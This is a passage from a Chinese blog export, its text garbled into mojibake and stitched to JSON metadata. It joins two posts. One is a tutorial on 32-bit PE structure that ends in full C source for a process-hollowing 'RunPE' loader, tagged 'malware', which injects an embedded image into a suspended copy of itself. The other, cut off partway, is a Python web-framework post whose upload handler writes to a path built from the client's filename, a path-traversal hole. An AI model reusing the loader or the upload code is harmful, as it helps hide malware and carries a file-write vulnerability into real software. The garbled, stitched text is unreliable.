APIç¼–å†™PEæ–‡ä»¶åŠ è½½å™¨ï¼ˆLoaderï¼‰ ç›®å‰æ”¯æ”¯æŒ32ä½ PEæ–‡ä»¶ç»“æ„ åœ¨ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ä¸­è®²çš„å·²ç»å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¸»è¦é¢å‘32ä½çš„å¯æ‰§è¡Œç¨‹åºæ¥è®²è§£ã€‚ DOSå¤´å’ŒPEå¤´ç»Ÿç§°ä¸ºPEå¤´ï¼Œä¸‹é¢çš„éƒ¨åˆ†ç§°ä¹‹ä¸ºPEä½“ã€‚ DOSå¤´ DOSå¤´çš„æ–‡ä»¶ç»“æ„ 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // æ–‡ä»¶æœ€åä¸€é¡µçš„å­—èŠ‚æ•° WORD e_cp; // æ–‡ä»¶ä¸­çš„é¡µæ•° WORD e_crlc; // é‡å®šä½ WORD e_cparhdr; // æ®µä¸­å¤´å¤§å° WORD e_minalloc; // éœ€è¦æœ€å°‘çš„é¢å¤–æ®µè½ WORD e_maxalloc; // éœ€è¦æœ€å¤šçš„é¢å¤–æ®µè½ WORD e_ss; // åˆå§‹ï¼ˆç›¸å¯¹ï¼‰SS å€¼ WORD e_sp; // åˆå§‹SPå€¼ WORD e_csum; // Checksum WORD e_ip; // åˆå§‹ IP å€¼ WORD e_cs; // åˆå§‹ï¼ˆç›¸å¯¹ï¼‰CS å€¼ WORD e_lfarlc; // é‡å®šä½è¡¨çš„æ–‡ä»¶åœ°å€ WORD e_ovno; // å åŠ æ•° WORD e_res[4]; // ä¿ç•™å­— WORD e_oemid; // OEM æ ‡è¯†ç¬¦ï¼ˆç”¨äº e_oeminfoï¼‰ WORD e_oeminfo; // OEMä¿¡æ¯ï¼› e_oemid å…·ä½“ WORD e_res2[10]; // ä¿ç•™å­— LONG e_lfanew; // æ–°exeå¤´æ–‡ä»¶åœ°å€ &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; å…¶ä¸­DOSå¤´æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„éƒ¨åˆ†e_lfanewï¼Œä»–æŒ‡å‘äº†exeçš„æ–‡ä»¶å¤´ï¼Œåœ¨æˆ‘ä»¬ç¼–å†™çš„loaderè·å–å¤´çš„éƒ¨åˆ† 12DOSHeader = PIMAGE_DOS_HEADER(Image); //å¾—åˆ°DOSå¤´NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); //å¾—åˆ°PEå¤´ NTå¤´ é‚£ä¹ˆå…³äºNTæ–‡ä»¶å¤´ 12345678910typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //æ–‡ä»¶ç±»å‹ // IMAGE_DOS_SIGNATURE 0x5A4D // MZ // IMAGE_OS2_SIGNATURE 0x454E // NE // IMAGE_OS2_SIGNATURE_LE 0x454C // LE // IMAGE_VXD_SIGNATURE 0x454C // LE // IMAGE_NT_SIGNATURE 0x00004550 // PE00 IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; è¿™ä¸ªæ–‡ä»¶å¤´å¾ˆå…³é”®ï¼ŒSignatureå¯ä»¥åˆ¤æ–­ç±»å‹ï¼ŒFileHeaderå³æ–‡ä»¶å¤´ï¼Œå¯ä»¥ä»NumberOfSectionsè·å¾—èŠ‚åŒºæ•°ç›®ã€‚ OPTIONAL_HEADERç»“æ„ä½“å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; OPTIONAL_HEADERä¸­è®°è½½äº†å¾ˆå¤šè¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä¸­æœ‰ç”¨çš„å°±æ˜¯ImageBaseã€SizeOfHeaderså’ŒAddressOfEntryPoint ImageBaseï¼šæå†™åœ¨è™šæ‹Ÿå†…å­˜ä¸­ï¼ˆä¸äº†è§£æ“ä½œç³»ç»Ÿçš„è¯å¯ä»¥ç†è§£ä¸ºç¨‹åºå¯åŠ¨çš„åŸºåœ°å€ï¼‰çš„åœ°å€ SizeOfHeadersï¼šè®°å½•äº†æ•´ä¸ªPEå¤´çš„å¤§å°ï¼ˆåŒ…å«DOSå¤´ï¼‰ï¼Œæ–¹ä¾¿æ§åˆ¶å†™å…¥ç¨‹åºçš„å¤§å° AddressOfEntryPointï¼šè®°å½•ç¨‹åºå…¥å£ä»£ç èµ·å§‹åœ°å€ï¼Œæ¯”å¦‚ImageBaseå¯èƒ½ä¸º0x4000ï¼ŒAddressOfEntryPointå¯èƒ½ä¸º0x4100ã€‚ IATå¯¼å…¥è¡¨ Windowsä¸ºäº†çŸ¥é“ä½¿ç”¨äº†é‚£äº›å‡½æ•°ï¼Œä¼šå¯¼å…¥è¿™äº›å‡½æ•°çš„è¡¨ï¼Œä»å¯¼å…¥è¡¨åˆ°åŠ¨æ€é“¾æ¥ä¸­æŸ¥æ‰¾å‡½æ•°ã€‚æ¯ä¸€ä¸ªèŠ‚éƒ½ä¼šæœ‰ä¸€ä¸ªå¯¼å…¥è¡¨ï¼Œæ¯ä¸€ä¸ªè¡¨çš„ä¿¡æ¯æœ‰40å­—èŠ‚ï¼Œé‚£ä¹ˆæ‰¾åˆ°è¡¨çš„åœ°å€å°±æ˜¯base + count*40ï¼Œå…¶ä¸­baseä¸ºDOSHeader-&gt;e_lfanew+248ï¼Œè¿™é‡Œæ˜¯å¯¼å…¥è¡¨çš„åˆå§‹åœ°å€çš„æŒ‡é’ˆã€‚ è¿›ç¨‹ç»“æ„ Pre- PEB è¿™éƒ¨åˆ†æ˜¯é“ºå«çš„å†…å®¹ï¼Œä¸»è¦æè¿°çš„å°±æ˜¯å‡ ä¸ªåŸºç¡€å¯„å­˜å™¨ã€‚ è¿™äº›å¯„å­˜å™¨æ˜¯CPUä¸­è®¾è®¡å¥½çš„ï¼Œ CS (Code Segment Register)ï¼šä»£ç æ®µçš„æ®µåŸºå€ DS(Data Segment Register)ï¼šæ•°æ®æ®µçš„æ®µåŸºå€ ES(Extra Segment Register)ï¼šå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€¼ï¼Œç§°ä¸ºâ€œé™„åŠ â€æ˜¯å› ä¸ºæ­¤æ®µå¯„å­˜å™¨ç”¨é€”ä¸åƒå…¶ä»– sreg é‚£æ ·å›ºå®šï¼Œå¯ä»¥é¢å¤–åšä»–ç”¨ã€‚ FS(Extra Segment Register)ï¼šå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€¼ GSï¼šåŒä¸Š SS(Stack Segment Register)ï¼šå †æ ˆæ®µå¯„å­˜å™¨ åœ¨å®æ¨¡å¼ä¸­ï¼ŒCSã€DSã€ESã€SSä¸­çš„å€¼æ˜¯ç‰©ç†åœ°å€ åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œè£…å…¥å¯„å­˜å™¨çš„æ˜¯æ®µé€‰æ‹©å­FS å…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯ FSå¯„å­˜å™¨ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œx86å¤„ç†å™¨ä½¿ç”¨æ®µæè¿°ç¬¦æ¥ç®¡ç†å†…å­˜ï¼Œå°†å†…å­˜åˆ’åˆ†ä¸ºä¸åŒçš„æ®µï¼Œå¦‚ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µç­‰ã€‚æ®µé€‰æ‹©å­æ˜¯ä¸€ä¸ª16ä½çš„å€¼ï¼Œç”¨äºæ ‡è¯†ç‰¹å®šæ®µçš„èµ·å§‹åœ°å€å’Œè®¿é—®æƒé™ã€‚ FSå¯„å­˜å™¨ä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼š å®šä½çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼ŒTLSï¼‰ï¼š åœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹é€šå¸¸éƒ½æœ‰è‡ªå·±çš„TLSï¼Œç”¨äºå­˜å‚¨çº¿ç¨‹æœ¬åœ°çš„æ•°æ®ï¼Œå¦‚çº¿ç¨‹ç‰¹å®šå˜é‡ã€‚ FSå¯„å­˜å™¨ä¸­å­˜å‚¨äº†ä¸€ä¸ªç‰¹æ®Šçš„æ®µé€‰æ‹©å­ï¼Œç”¨äºå®šä½çº¿ç¨‹çš„TLSã€‚ çº¿ç¨‹å¯ä»¥é€šè¿‡è®¿é—®FSå¯„å­˜å™¨æ¥è®¿é—®è‡ªå·±çš„TLSã€‚ è®¿é—®æ®µæè¿°ç¬¦è¡¨ï¼ˆGlobal Descriptor Tableï¼ŒGDTï¼‰ï¼š GDTæ˜¯ä¸€ä¸ªè¡¨æ ¼ï¼Œç”¨äºå­˜å‚¨æ®µæè¿°ç¬¦çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ®µçš„èµ·å§‹åœ°å€ã€å¤§å°ã€è®¿é—®æƒé™ç­‰ã€‚ FSå¯„å­˜å™¨ä¸­å­˜å‚¨äº†GDTä¸­çš„ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œè¯¥æ®µé€‰æ‹©å­æŒ‡å‘äº†ä¸€ä¸ªæè¿°çº¿ç¨‹å±€éƒ¨å­˜å‚¨æ®µçš„æ®µæè¿°ç¬¦ã€‚ å½“çº¿ç¨‹éœ€è¦è®¿é—®TLSæ—¶ï¼Œé€šè¿‡è®¿é—®FSå¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©å­ï¼Œå¯ä»¥è·å¾—TLSçš„èµ·å§‹åœ°å€å’Œè®¿é—®æƒé™ã€‚ PEB PEBå…¨ç§°æ˜¯ Process Environment Blockï¼Œè¿›ç¨‹ç¯å¢ƒå— ä¸ºäº†è·å–PEBçš„æ¶ˆæ¯å¯ä»¥ç›´æ¥ä»FSæ®µé€‰æ‹©å­æ‰¾åˆ°TEBï¼ˆçº¿ç¨‹ç¯å¢ƒå—ï¼‰ï¼Œå†ä»TEBæ‰¾åˆ°PEBï¼Œè¿™é‡Œå¯ä»¥CTX-&gt;Ebx + 8æ‰¾åˆ°PEB ç¼–ç¨‹ç›¸å…³ åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨CreateProcesså‡½æ•° æ–°è¿›ç¨‹åœ¨è°ƒç”¨è¿›ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚ å¦‚æœè°ƒç”¨è¿›ç¨‹æ­£åœ¨æ¨¡æ‹Ÿå…¶ä»–ç”¨æˆ·ï¼Œåˆ™æ–°è¿›ç¨‹å°†ä»¤ç‰Œç”¨äºè°ƒç”¨è¿›ç¨‹ï¼Œè€Œä¸æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œã€‚ è‹¥è¦åœ¨æ¨¡æ‹Ÿä»¤ç‰Œè¡¨ç¤ºçš„ç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œæ–°è¿›ç¨‹ï¼Œè¯·ä½¿ç”¨ CreateProcessAsUser æˆ– CreateProcessWithLogonW å‡½æ•°ã€‚ 123456789101112BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation); lpApplicationNameï¼šexeçš„æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚c:\\test.exe lpCommandLineï¼šè¦æ‰§è¡Œè¯¥ç¨‹åºæ—¶çš„å‚æ•° bInheritHandlesï¼šå¦‚æœæ­¤å‚æ•°ä¸º TRUEï¼Œåˆ™è°ƒç”¨è¿›ç¨‹ä¸­çš„æ¯ä¸ªå¯ç»§æ‰¿å¥æŸ„éƒ½ç”±æ–°è¿›ç¨‹ç»§æ‰¿ã€‚ å¦‚æœå‚æ•°ä¸º FALSEï¼Œåˆ™ä¸ç»§æ‰¿å¥æŸ„ã€‚ dwCreationFlagsï¼šæ§åˆ¶ä¼˜å…ˆçº§ç±»å’Œè¿›ç¨‹çš„åˆ›å»ºçš„æ ‡å¿—ã€‚ lpProcessInformationï¼šè¿›ç¨‹ä¿¡æ¯ windowsä¸­ä½¿ç”¨PROCESS_INFORMATIONæè¿° 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //æ–°åˆ›å»ºçš„è¿›ç¨‹çš„å¥æŸ„ã€‚ å¥æŸ„ç”¨äºåœ¨å¯¹è¿›ç¨‹å¯¹è±¡æ‰§è¡Œæ“ä½œçš„æ‰€æœ‰å‡½æ•°ä¸­æŒ‡å®šè¿›ç¨‹ã€‚ HANDLE hThread; //æ–°åˆ›å»ºçš„è¿›ç¨‹çš„ä¸»çº¿ç¨‹çš„å¥æŸ„ã€‚ å¥æŸ„ç”¨äºåœ¨çº¿ç¨‹å¯¹è±¡ä¸Šæ‰§è¡Œæ“ä½œçš„æ‰€æœ‰å‡½æ•°ä¸­æŒ‡å®šçº¿ç¨‹ã€‚ DWORD dwProcessId; //å¯ç”¨äºæ ‡è¯†è¿›ç¨‹çš„å€¼ã€‚ ä»åˆ›å»ºè¿›ç¨‹åˆ°è¿›ç¨‹çš„æ‰€æœ‰å¥æŸ„å…³é—­å¹¶é‡Šæ”¾è¿›ç¨‹å¯¹è±¡ä¸ºæ­¢ï¼Œè¯¥å€¼æœ‰æ•ˆ;æ­¤æ—¶ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨æ ‡è¯†ç¬¦ã€‚ DWORD dwThreadId; //å¯ç”¨äºæ ‡è¯†çº¿ç¨‹çš„å€¼ã€‚ åœ¨çº¿ç¨‹åˆ›å»ºåˆ°çº¿ç¨‹çš„æ‰€æœ‰å¥æŸ„å…³é—­ä¸”çº¿ç¨‹å¯¹è±¡é‡Šæ”¾ä¹‹å‰ï¼Œè¯¥å€¼æœ‰æ•ˆ;æ­¤æ—¶ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨æ ‡è¯†ç¬¦ã€‚&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; lpStartupInfoï¼šå¯åŠ¨æ—¶çš„ä¿¡æ¯ åŒæ—¶å¦‚æœè¦å¼€å¯ä¸€ä¸ªè¿›ç¨‹çš„è¯éœ€è¦å‘å…¶æä¾›åŸºç¡€ç¯å¢ƒï¼Œwindowsä¸­ä¸ºSTARTUPINFOAï¼ŒæŒ‡å®šåˆ›å»ºæ—¶è¿›ç¨‹çš„ä¸»çª—å£çš„çª—å£å·¥ä½œç«™ã€æ¡Œé¢ã€æ ‡å‡†å¥æŸ„å’Œå¤–è§‚ã€‚ 12345678910111213typedef struct _STARTUPINFOA &#123; DWORD cb; //ç»“æ„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ LPSTR lpReserved; //ä¿ç•™;å¿…é¡»ä¸º NULL ... DWORD dwFlags; //ä¸€ä¸ªä½å­—æ®µï¼Œç”¨äºç¡®å®šè¿›ç¨‹åˆ›å»ºçª—å£æ—¶æ˜¯å¦ä½¿ç”¨æŸäº› STARTUPINFO æˆå‘˜ã€‚ æ­¤æˆå‘˜å¯ä»¥æ˜¯ä»¥ä¸‹ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ã€‚ //å‚è€ƒ https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa ... WORD cbReserved2; //ä¿ç•™ä¾› C è¿è¡Œæ—¶ä½¿ç”¨;å¿…é¡»ä¸ºé›¶ã€‚ LPBYTE lpReserved2; //ä¿ç•™ä¾› C è¿è¡Œæ—¶ä½¿ç”¨;å¿…é¡»ä¸º NULLã€‚ HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOA, *LPSTARTUPINFOA; æœ€ååˆ›å»ºå¥½çš„è¿›ç¨‹å°±åœ¨lpProcessInformationçš„hProcessä¸­äº† ç¼–å†™Loaderï¼ˆè¿›ç¨‹é•‚ç©ºï¼‰ çŸ¥é“äº†åŠ è½½è¿‡ç¨‹ï¼Œé‚£ä¹ˆ è·å¾—DOSå¤´ï¼Œä»è€Œè·å¾—NTå¤´ æ£€æŸ¥æ˜¯å¦ä¸ºæ­£ç¡®çš„æ–‡ä»¶æ ¼å¼ï¼ˆPEï¼‰ åˆå§‹åŒ–è¿›ç¨‹ä¿¡æ¯å’Œå¯åŠ¨æ—¶ä¿¡æ¯ åˆ›å»ºå½“å‰ç¨‹åºè¿›ç¨‹çš„å‰¯æœ¬ï¼Œå¹¶å°†å‰¯æœ¬è®¾ç½®ä¸ºæš‚åœ æ ¹æ®ä¸Šä¸‹æ–‡ä¿¡æ¯æ‰¾åˆ°å¯¼å…¥è¡¨å’ŒPEB å¤åˆ¶å¯¼å…¥è¡¨å’ŒPEBï¼Œå°†EAXè®¾ç½®ä¸ºå¾…åŠ è½½PEæ–‡ä»¶çš„å…¥å£åœ°å€DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint; æ¢å¤æš‚åœçš„å‰¯æœ¬ï¼Œè¿è¡ŒåŠ è½½çš„PEæ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;TlHelp32.h&gt;int RunPe(HANDLE Image)&#123; IMAGE_DOS_HEADER* DOSHeader; //DOSæ–‡ä»¶å¤´ IMAGE_NT_HEADERS* NTHeader; //PEæ–‡ä»¶å¤´ IMAGE_SECTION_HEADER* SectionHeader; //èŠ‚å¤´ PROCESS_INFORMATION PI; //è¿›ç¨‹ä¿¡æ¯ STARTUPINFOA SI; //å¯åŠ¨ä¿¡æ¯ DWORD* ImageBase; //VARåŸºåœ°å€ void* pImageBase; //æŒ‡å‘å¤´çš„æŒ‡é’ˆ int count; char FilePath[1024]; DOSHeader = PIMAGE_DOS_HEADER(Image); //å¾—åˆ°DOSå¤´ NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); //å¾—åˆ°PEå¤´ GetModuleFileNameA(0, FilePath, 1024); if (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123; //æ£€æŸ¥æ˜¯å¦ä¸ºPEæ–‡ä»¶ ZeroMemory(&amp;PI, sizeof(PI)); ZeroMemory(&amp;SI, sizeof(SI)); if (CreateProcessA(FilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;SI, &amp;PI)) &#123; //åˆ›å»ºå½“å‰è¿›ç¨‹çš„æš‚åœå‰¯æœ¬ CONTEXT *CTX = PCONTEXT(VirtualAlloc(NULL,sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); CTX-&gt;ContextFlags = CONTEXT_FULL; //åˆ›å»ºä¸Šä¸‹æ–‡ if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123; //å¦‚æœä¸Šä¸‹æ–‡åœ¨çº¿ç¨‹ä¸­ //è¯»å–æŒ‡ä»¤ ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;ImageBase), 4, 0); pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase), NTHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE); // å‘è¿›ç¨‹çš„æš‚åœå‰¯æœ¬å†™å…¥æŒ‡ä»¤ WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, NULL); for (count = 0; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123; SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+248+(count*40)); WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress), LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, 0); &#125; WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), 4, 0); //å°†å…¥å£åœ°å€æ”¾å…¥EAXå¯„å­˜å™¨ CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint; SetThreadContext(PI.hThread, LPCONTEXT(CTX)); ResumeThread(PI.hThread); return 1; &#125; &#125; &#125;&#125;unsigned char rawData[91209] = &#123;...&#125;;int main()&#123; RunPe(rawData); //getchar(); return 0;&#125;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"ã€Muudå¼€å‘ã€‘2.HTTPæœåŠ¡æ”¹å–„","slug":"web-0x2","date":"2023-06-01T12:15:29.000Z","updated":"2023-06-06T07:15:20.342Z","comments":true,"path":"2023/06/01/web-0x2/","link":"","permalink":"https://joe1sn.eu.org/2023/06/01/web-0x2/","excerpt":"ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€ é¡¹ç›®åœ°å€ï¼šhttps://github.com/Joe1sn/muud","text":"ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€ é¡¹ç›®åœ°å€ï¼šhttps://github.com/Joe1sn/muud ä¸»è¦æ”¹è¿› 6-1 è¿”å›æŠ¥æ–‡è®¾ç½® é¦–å…ˆå°†åŸæ¥çš„æ‹¼æ¥å­—ç¬¦ä¸²æ”¹ä¸ºäº†Responseç±»ï¼Œå®ç°HTTPæŠ¥æ–‡å­—æ®µçš„è‡ªå®šä¹‰ è¿™æ ·å¯ä»¥å¤§å¤§ç®€åŒ–view.pyä¸­çš„ä»£ç  123456789101112131415161718192021class Response(): def __init__(self, type=&quot;json&quot;, status_code=200, reply=&quot;&quot;) -&gt; None: self.content_type = content_types[type] self.status_code = status_code if type == &quot;json&quot;: self.reply = json.dumps(reply, ensure_ascii=False).encode(&#x27;unicode_escape&#x27;).decode() else: self.reply = reply self.length = len(self.reply) def consum(self) -&gt; str: result = &quot;&quot; result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result += self.reply return result è¿™æ ·å°±å¯ä»¥æ›´ç®€å•çš„ç¼–å†™è§†å›¾å‡½æ•° 12345@http_apidef html_test(http_request): data = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot; result = Response(reply=data,type=&quot;html&quot;) return result.consum().encode() ä¸è¿‡ä»»ç„¶æ¬ ç¼ºæ–‡ä»¶æœåŠ¡ï¼Œä¸è¿‡åœ¨epollæœåŠ¡å™¨çš„sendéƒ¨åˆ†ä¿®æ”¹å°±è¡Œäº†ï¼Œæ›´å¤æ‚çš„è¿˜æ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼ ç­‰ï¼Œåç»­å®ç°http.serverè¿™ç§æœåŠ¡æ•ˆæœï¼Œä¸ç„¶é™æ€ç½‘é¡µåŠ è½½å¾ˆéº»çƒ¦ã€‚ 6-2 è®¾ç½®æ›´å¤šçš„content_type 123456789101112131415161718192021content_types = &#123; &quot;text&quot;: &quot;text/plain&quot;, &quot;html&quot;: &quot;text/html&quot;, #HTMLæ–‡æ¡£ &quot;css&quot; : &quot;text/css&quot;, #CSSæ ·å¼è¡¨ &quot;js&quot; : &quot;text/javascript&quot;, #JavaScriptè„šæœ¬ &quot;json&quot;: &quot;application/json&quot;, &quot;pdf&quot;: &quot;application/pdf&quot;, &quot;xml&quot;: &quot;application/xml&quot;, &quot;bin&quot;: &quot;application/octet-stream&quot;, #[ç‰¹è´¨] &quot;jpeg&quot;: &quot;image/jpeg&quot;, #JPEGå›¾åƒ &quot;png&quot;: &quot;image/png&quot;, #PNGå›¾åƒ &quot;gif&quot;: &quot;image/gif&quot;, #GIFå›¾åƒ &quot;mpeg&quot;: &quot;audio/mpeg&quot;, #MPEGéŸ³é¢‘ &quot;wav&quot;: &quot;audio/wav&quot;, #WAVéŸ³é¢‘ &quot;mp4&quot; : &quot;video/mp4&quot;, #MP4è§†é¢‘ &quot;mpeg&quot; : &quot;video/mpeg&quot;, #MPEGè§†é¢‘&#125; Responseçš„è¿”å›æ”¹ä¸ºbytesç±»å‹ 123456789101112131415def consum(self) -&gt; bytes: result = &quot;&quot; result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result = result.encode() if type(self.reply) == bytes: result += self.reply else: result += self.reply.encode() return result è¿™æ ·å°±èƒ½ç›´æ¥è®¿é—®å„ç§æ–‡ä»¶äº†ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ­¥æ¸²æŸ“ 1234567@http_apidef file_test(http_request): result=&quot;&quot; with open(r&quot;/mnt/d/Github/muud/test/test.pdf&quot;,&quot;rb&quot;) as f: result = f.read() result = Response(reply=result,type=&quot;pdf&quot;) return result.consum() 6-3~4 æ–‡ä»¶ä¸Šä¼  è¿™éƒ¨åˆ†å†™çš„æŒºä¹…çš„ï¼Œå› ä¸ºæ¶‰åŠåˆ°epollæ¨¡å‹çš„æ”¹å–„ï¼Œåé¢å›ç»§ç»­æ”¹è¿›è¿™ä¸ªæ¨¡å— é¦–å…ˆæœ‰è¿™ä¸¤ä¸ªè§†å›¾å‡½æ•° 1234567891011121314151617181920@http_apidef file_upload(http_request): result=&quot;&quot; with open(r&quot;/mnt/d/Github/muud/test/file_upload.html&quot;,&quot;rb&quot;) as f: result = f.read() result = Response(reply=result,type=&quot;html&quot;) return result.consum()@http_apidef upload(http_request): result=&quot;&quot; info(&quot;FILE Content&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;) # info(http_request.data[&quot;len&quot;]/1024,&quot;KB&quot;) name = http_request.data[&quot;filename&quot;] # print(http_request.data[&quot;file&quot;][:0x20]) with open(r&quot;/mnt/d/Github/muud/test/&quot;+name,&quot;wb&quot;) as f: result = f.write(http_request.data[&quot;file&quot;]) data = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;okok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot; result = Response(reply=data,type=&quot;html&quot;,status_code=200) return result.consum() ç›®å‰å‚è€ƒäº†Djangoçš„ä¸Šä¼ ï¼ŒæŠŠæ•°æ®ç»“æœæ”¶é›†åœ¨requestä¸­ç„¶åå¤„ç† é‚£ä¹ˆå°±æ¶‰åŠHttpRequestçš„å¤„ç† é¦–å…ˆæ–°å¢äº†ä¸¤ä¸ªå­—æ®µ 12self.length = 0 #æ€»é•¿åº¦self.cur_len = 0 #å½“å‰é•¿åº¦ ä»è¿™ä¸ªåˆ¤æ–­æ–‡ä»¶ä¸Šä¼ æ˜¯å¦å®Œæˆï¼Œç„¶åå°±æ˜¯æ¶ˆæ¯çš„æå– 1234567891011121314151617181920212223#æ–‡ä»¶ä¸Šä¼ ï¼Œè¿”å›bytesç±»å‹æ•°æ®elif &quot;multipart&quot; in content_type: pre_len = len(self.raw_data.split(b&quot;\\r\\n\\r\\n&quot;)[0])+4 raw_data = 